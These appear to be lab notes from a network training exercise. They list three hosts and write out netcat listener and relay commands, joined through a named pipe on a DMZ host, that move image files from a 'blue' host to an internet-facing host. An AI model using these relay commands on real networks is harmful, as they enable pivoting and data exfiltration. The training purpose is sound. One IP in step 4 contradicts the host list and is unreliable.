T1
Hostname: INTERNET_HOST
External IP: 10.50.27.129 Internal IP: 10.10.0.40 (ALREADY PROVIDED) (accessed via FLOAT IP)
creds: (ALREADY PROVIDED)
Action: Successfully transfer file data between hosts via Netcat

T2
Hostname: BLUE_HOST-4
IP: 172.16.82.115
creds: (NONE)
Action: Successfully transfer files from this host using Netcat

RELAY
Hostname: BLUE_INT_DMZ_HOST-1
IP: 172.16.40.10
creds: (ALREADY PROVIDED)
Action: Successfully transfer file data between hosts via Netcat

T1 > Relay > T2:file

1. T1 C -> S Relay S <- C T2
[nc 172.16.40.10 1234]  -->  nc -lvp 1234 < pipe | nc 10.10.0.40 4444 > pipe  -->  nc -lvp 4444 > 1steg.jpg
mkfifo pipe


2. T1 C -> S Relay S <- C T2
[nc 172.16.40.10 4321]  -->  nc -lvp 4321 < pipe | nc 10.10.0.40 4444 > pipe  -->  nc -lvp 4444 > 2steg.jpg


3. T1 S <- C Relay C -> S T2
[nc -lvp 6789]  -->  nc 172.16.82.115 6789 < pipe | nc 10.10.0.40 4444 > pipe  -->  nc -lvp 4444 > 3steg.jpg


4. T1 S <- C Relay C -> S T2
[nc -lvp 9876] -->  nc 176.16.82.115 9876 < pipe | nc 10.10.0.40 4444 > pipe  -->  nc -lvp 4444 > 4steg.jpg
